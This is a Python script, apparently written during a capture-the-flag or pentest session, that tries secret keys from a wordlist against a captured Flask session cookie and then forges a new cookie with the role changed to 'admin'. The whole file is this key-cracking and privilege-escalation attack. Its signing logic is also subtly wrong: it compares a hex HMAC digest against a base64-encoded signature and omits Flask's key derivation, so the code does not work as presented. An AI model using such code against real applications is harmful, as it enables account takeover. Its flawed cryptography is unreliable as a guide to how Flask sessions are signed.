
import hashlib
import hmac
import base64
import re

def sign_session(payload, secret_key):
    """Flask session signing"""
    payload_b64 = base64.b64encode(payload.encode()).rstrip(b'=').decode()
    signature = hmac.new(secret_key.encode(), payload_b64.encode(), hashlib.sha1).hexdigest()
    return signature

# Original session:
original_session = "eyJyb2xlIjoidXNlciIsInVpZCI6ImQ2Yjg4OTBmYmQzOTQ1NjBiZjk3OWRlYjVjMDVkZjc3IiwidXNlcm5hbWUiOiJhYWEifQ.acdBtw.TizbaPtvU5gyzcLdh1rrK7il3Ko"
parts = original_session.split('.')
original_payload = parts[0]
original_timestamp = parts[1]
original_signature = parts[2]

# Our modified payload (role=admin)
modified_payload_json = '{"role":"admin","uid":"d6b8890fbd394560bf979deb5c05df77","username":"aaa"}'
modified_payload_b64 = base64.b64encode(modified_payload_json.encode()).rstrip(b'=').decode()

# Read wordlist
with open('C:\\Users\\32728\\.openclaw\\workspace\\flask_secret_keys.txt', 'r') as f:
    for line in f:
        secret = line.strip()
        if not secret:
            continue
        # Check original signature first
        original_test_signature = hmac.new(secret.encode(), f"{original_payload}.{original_timestamp}".encode(), hashlib.sha1).hexdigest()
        if original_test_signature == original_signature:
            print(f"Found original secret key: {secret}")
            # Sign modified payload
            new_signature = hmac.new(secret.encode(), f"{modified_payload_b64}.{original_timestamp}".encode(), hashlib.sha1).hexdigest()
            new_session = f"{modified_payload_b64}.{original_timestamp}.{new_signature}"
            print(f"New session with role=admin: {new_session}")
            exit()

print("No secret found in wordlist")
